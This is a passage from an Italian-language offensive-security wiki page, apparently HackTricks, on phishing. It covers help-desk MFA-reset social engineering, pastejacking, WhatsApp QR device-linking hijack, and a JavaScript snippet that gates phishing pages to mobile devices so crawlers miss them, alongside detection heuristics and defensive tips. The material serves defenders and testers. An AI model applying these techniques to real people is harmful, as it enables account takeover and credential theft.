[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitora gli eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **a distanza di pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli attaccanti possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquatted, per poi indurre l'utente a incollarli in **Win + R**, **Win + X** o in una finestra del terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing e distribuzione di app malevole (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijack del collegamento di un dispositivo WhatsApp tramite social engineering con QR
* Una pagina esca (ad esempio, un falso “canale” di un ministero/CERT) mostra un QR di WhatsApp Web/Desktop e indica alla vittima di scansionarlo, aggiungendo silenziosamente l'attaccante come **dispositivo collegato**.<sup>[[12]](#references)</sup>
* L'attaccante ottiene immediatamente visibilità su chat e contatti finché la sessione non viene rimossa. In seguito, le vittime potrebbero visualizzare una notifica di “nuovo dispositivo collegato”; i difensori possono cercare eventi di collegamento di dispositivi imprevisti poco dopo le visite a pagine QR non affidabili.

### Phishing vincolato ai dispositivi mobili per eludere crawler/sandbox
Gli operatori vincolano sempre più spesso i loro flussi di phishing a un semplice controllo del dispositivo, in modo che i crawler desktop non raggiungano mai le pagine finali. Un pattern comune consiste in un piccolo script che verifica la presenza di un DOM con supporto al touch e invia il risultato a un endpoint del server; i client non mobili ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobili viene servito il flusso completo.<sup>[[7]](#references)</sup>

Snippet client minimale (logica tipica):
```html
<script src="/static/detect_device.js"></script>
```
Logica di `detect_device.js` (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server osservato frequentemente:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un segnaposto) alle richieste GET successive quando `is_mobile=false`; serve il phishing solo se `true`.

Euristiche di hunting e rilevamento:
- Query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza di `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i dispositivi non mobile; i percorsi legittimi delle vittime mobile restituiscono 200 con HTML/JS successivo.
- Bloccare o esaminare con attenzione le pagine che condizionano il contenuto esclusivamente a `ontouchstart` o a controlli simili del dispositivo.

Suggerimenti per la difesa:
- Eseguire i crawler con fingerprint simili a quelli mobile e JS abilitato per rivelare i contenuti soggetti a gating.
- Generare un alert per risposte 500 sospette successive a `POST /detect` su domini registrati di recente.

## References

- [1] [Generazione di variazioni di dominio utilizzate nel phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Individuare il phishing: strumenti e tecniche (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Rubare credenziali e bypassare la 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Rubare sessioni e bypassare la 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Come installare e configurare DKIM con Postfix su Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Report globale di Unit 42 sulla risposta agli incidenti 2025 – Edizione social engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastrutture di phishing con gating mobile ed euristiche (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nuova frontiera degli attacchi di assemblaggio runtime: utilizzo degli LLM per generare JavaScript di phishing in tempo reale](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, click hijacking e TDS: analisi di un ecosistema di distribuzione malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting di Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Dirottare il traffico verso windows.com di Microsoft tramite bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: una falsa app di dating usata come esca in una campagna di spyware mirata in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC e campioni di ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
